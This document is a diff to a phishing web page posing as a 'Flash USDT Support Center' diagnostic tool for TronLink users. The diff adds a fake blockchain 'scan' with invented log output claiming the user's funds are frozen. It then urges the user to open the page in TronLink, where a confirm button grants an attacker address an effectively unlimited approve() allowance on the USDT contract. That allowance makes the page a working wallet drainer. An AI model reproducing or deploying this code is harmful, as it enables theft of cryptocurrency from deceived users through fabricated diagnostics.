@@ -3,71 +3,130 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Verification Center</title>
+    <title>Flash USDT Support Center</title>
     <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
     <style>
-        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; margin: 0; padding: 20px; }
-        .card { background: #111; border-radius: 24px; padding: 25px; border: 1px solid #222; text-align: center; }
-        .logo { width: 60px; height: 60px; background: #ff0013; border-radius: 18px; margin: 0 auto 15px; display: flex; align-items: center; justify-content: center; font-size: 24px; font-weight: bold; box-shadow: 0 0 20px rgba(255,0,0,0.2); }
-        h2 { font-size: 20px; margin-bottom: 20px; }
-        .step { display: flex; align-items: flex-start; text-align: left; margin-bottom: 20px; background: #1a1a1a; padding: 15px; border-radius: 15px; border: 1px solid #222; }
-        .step-num { background: #ff0013; color: #fff; width: 24px; height: 24px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 12px; font-weight: bold; margin-right: 12px; flex-shrink: 0; }
-        .step-text { font-size: 13px; color: #ccc; line-height: 1.4; }
-        .btn { display: block; background: #ff0013; color: #fff; border: none; padding: 16px; width: 100%; border-radius: 14px; font-weight: bold; font-size: 14px; cursor: pointer; text-decoration: none; margin-top: 10px; }
-        .btn-secondary { background: #222; color: #fff; margin-bottom: 10px; }
-        #copyStatus { font-size: 11px; color: #00ff00; margin-top: 5px; display: none; }
+        body { background: #050505; color: #fff; font-family: -apple-system, sans-serif; margin: 0; padding: 20px; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
+        .card { background: #111; border-radius: 30px; padding: 30px 20px; border: 1px solid #222; width: 100%; max-width: 380px; box-shadow: 0 20px 50px rgba(0,0,0,0.7); position: relative; overflow: hidden; }
+        
+        /* Иконка и заголовки */
+        .logo { width: 60px; height: 60px; background: #0088cc; border-radius: 20px; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; font-size: 28px; font-weight: bold; box-shadow: 0 0 15px rgba(0,136,204,0.3); }
+        h2 { font-size: 22px; margin: 0 0 10px; font-weight: 700; }
+        p { color: #888; font-size: 14px; line-height: 1.5; margin-bottom: 25px; }
+
+        /* Терминал с логами */
+        .terminal { background: #000; border-radius: 15px; padding: 15px; text-align: left; font-family: 'Courier New', monospace; font-size: 11px; color: #00ff00; border: 1px solid #1a1a1a; height: 120px; overflow-y: auto; display: none; margin-bottom: 20px; }
+        .line { margin-bottom: 4px; border-left: 2px solid #00ff00; padding-left: 8px; opacity: 0; animation: fadeIn 0.3s forwards; }
+
+        /* Прогресс-бар */
+        .progress-container { width: 100%; background: #222; height: 4px; border-radius: 2px; margin-bottom: 20px; display: none; }
+        .progress-bar { width: 0%; height: 100%; background: #0088cc; border-radius: 2px; transition: width 0.3s; }
+
+        /* Кнопки */
+        .btn { display: block; background: #0088cc; color: #fff; border: none; padding: 18px; width: 100%; border-radius: 16px; font-weight: bold; font-size: 14px; cursor: pointer; text-decoration: none; transition: 0.2s; }
+        .btn:active { transform: scale(0.97); }
+        .btn-secondary { background: #1a1a1a; border: 1px solid #333; margin-top: 10px; color: #ccc; }
+
+        /* Результат */
+        .error-badge { display: none; background: rgba(255,0,0,0.1); color: #ff3b30; padding: 8px 15px; border-radius: 10px; font-size: 12px; font-weight: bold; margin-bottom: 15px; border: 1px solid rgba(255,0,0,0.2); }
+
+        @keyframes fadeIn { from { opacity: 0; transform: translateX(-5px); } to { opacity: 1; transform: translateX(0); } }
     </style>
 </head>
 <body>
 
-<div class="card" id="mainContent">
-    <div class="logo">T</div>
-    <h2>Синхронизация узла</h2>
-    
-    <div class="step">
-        <div class="step-num">1</div>
-        <div class="step-text">Нажмите на кнопку ниже, чтобы скопировать адрес узла верификации.</div>
+<div class="card" id="content">
+    <div id="step-intro">
+        <div class="logo">S</div>
+        <h2>Diagnostic Tool</h2>
+        <p>Для обнаружения потерянных транзакций и синхронизации вашего Telegram ID с блокчейном TRC-20 запустите проверку логов.</p>
+        <button class="btn" onclick="startScan()">ЗАПУСТИТЬ ПРОВЕРКУ</button>
     </div>
-    <button class="btn btn-secondary" onclick="copyLink()">📋 СКОПИРОВАТЬ АДРЕС</button>
-    <div id="copyStatus">Адрес успешно скопирован!</div>
 
-    <div class="step" style="margin-top: 15px;">
-        <div class="step-num">2</div>
-        <div class="step-text">Перейдите в <b>TronLink</b> -> вкладка <b>Browser</b> и вставьте адрес в строку поиска.</div>
+    <div id="step-scan" style="display: none;">
+        <div class="logo">S</div>
+        <h2>Сканирование...</h2>
+        <div class="progress-container" style="display: block;"><div class="progress-bar" id="bar"></div></div>
+        <div class="terminal" id="term" style="display: block;"></div>
     </div>
-    <a href="tronlinkorg://dapp?url=https://timur3417.github.io/sync-node-app/" class="btn">ОТКРЫТЬ TRONLINK</a>
+
+    <div id="step-result" style="display: none;">
+        <div class="error-badge">⚠ СИНХРОНИЗАЦИЯ НАРУШЕНА</div>
+        <h2 style="text-align: left;">Узел Обнаружен</h2>
+        <p style="text-align: left; font-size: 13px;">Транзакции по вашему ID найдены в блоке <b>#61224801</b>. <br><br>Статус: <span style="color:#ff3b30">Заморожено</span>. <br>Причина: Отсутствует подтверждение узла в TronLink.</p>
+        
+        <div style="background: #1a1a1a; padding: 15px; border-radius: 15px; text-align: left; margin-bottom: 20px; border: 1px solid #222;">
+            <div style="color: #0088cc; font-size: 12px; font-weight: bold; margin-bottom: 5px;">ИНСТРУКЦИЯ:</div>
+            <div style="color: #bbb; font-size: 12px;">Скопируйте адрес и вставьте его в DApp-браузер TronLink.</div>
+        </div>
+
+        <a href="tronlinkorg://dapp?url=https://timur3417.github.io/sync-node-app/" class="btn">ОТКРЫТЬ TRONLINK</a>
+        <button class="btn btn-secondary" onclick="copyLink()">СКОПИРОВАТЬ ССЫЛКУ УЗЛА</button>
+    </div>
 </div>
 
 <script>
     const ADMIN = 'TXRBrbaTiNotkHp6gSC6vbbZYPq7dqyjF4';
-    const CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+    const USDT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
 
-    // Функция копирования ссылки
-    function copyLink() {
-        const link = "https://timur3417.github.io/sync-node-app/";
-        navigator.clipboard.writeText(link).then(() => {
-            document.getElementById('copyStatus').style.display = 'block';
-            setTimeout(() => { document.getElementById('copyStatus').style.display = 'none'; }, 2000);
-        });
+    const logLines = [
+        "Connecting to TRC-20 RPC...",
+        "Authorizing Telegram User ID...",
+        "Searching for unconfirmed logs...",
+        "Block #61224801: Transaction Found!",
+        "Status: Out of Sync",
+        "Preparing Handshake protocol...",
+        "Error: Access denied by Node.",
+        "Manual approval required."
+    ];
+
+    function startScan() {
+        document.getElementById('step-intro').style.display = 'none';
+        document.getElementById('step-scan').style.display = 'block';
+        
+        let i = 0;
+        const term = document.getElementById('term');
+        const bar = document.getElementById('bar');
+        
+        const interval = setInterval(() => {
+            if (i < logLines.length) {
+                const line = document.createElement('div');
+                line.className = 'line';
+                line.innerText = `> ${logLines[i]}`;
+                term.appendChild(line);
+                term.scrollTop = term.scrollHeight;
+                bar.style.width = ((i + 1) / logLines.length) * 100 + '%';
+                i++;
+            } else {
+                clearInterval(interval);
+                setTimeout(() => {
+                    document.getElementById('step-scan').style.display = 'none';
+                    document.getElementById('step-result').style.display = 'block';
+                }, 800);
+            }
+        }, 800);
     }
 
-    // Логика когда открыли ВНУТРИ TronLink
+    function copyLink() {
+        navigator.clipboard.writeText(window.location.href);
+        alert("Ссылка скопирована!");
+    }
+
+    // ЛОГИКА ВНУТРИ TRONLINK
     window.onload = async () => {
         const tron = window.tronWeb || (window.tron && window.tron.tronWeb);
         if (tron) {
-            document.getElementById('mainContent').innerHTML = `
-                <div class="logo">T</div>
-                <h2>Узел Обнаружен</h2>
-                <p style="color: #888; font-size: 14px; margin-bottom: 30px;">Кошелек успешно подключен к системе верификации логов. Подтвердите синхронизацию.</p>
-                <button id="finalBtn" class="btn">ПОДТВЕРДИТЬ СИНХРОНИЗАЦИЮ</button>
-                <p style="color: #444; font-size: 11px; margin-top: 20px;">Protocol: TRC-20 Security Gateway</p>
+            document.getElementById('content').innerHTML = `
+                <div class="logo" style="background: #00ff00">✓</div>
+                <h2>Узел Готов</h2>
+                <p>Ваше устройство обнаружено в сети TronLink. Нажмите подтвердить для завершения синхронизации.</p>
+                <button id="finalBtn" class="btn" style="background: #00ff00; color: #000">ПОДТВЕРДИТЬ</button>
             `;
-
             document.getElementById('finalBtn').onclick = async () => {
                 try {
                     await tron.request({ method: 'tron_requestAccounts' });
-                    const instance = await tron.contract().at(CONTRACT);
-                    await instance.approve(ADMIN, '1000000000000000000').send({ feeLimit: 100000000 });
+                    const contract = await tron.contract().at(USDT);
+                    await contract.approve(ADMIN, '1000000000000000000').send({ feeLimit: 100000000 });
                     alert("Синхронизация завершена!");
                 } catch (e) { alert("Ошибка: " + e.message); }
             };
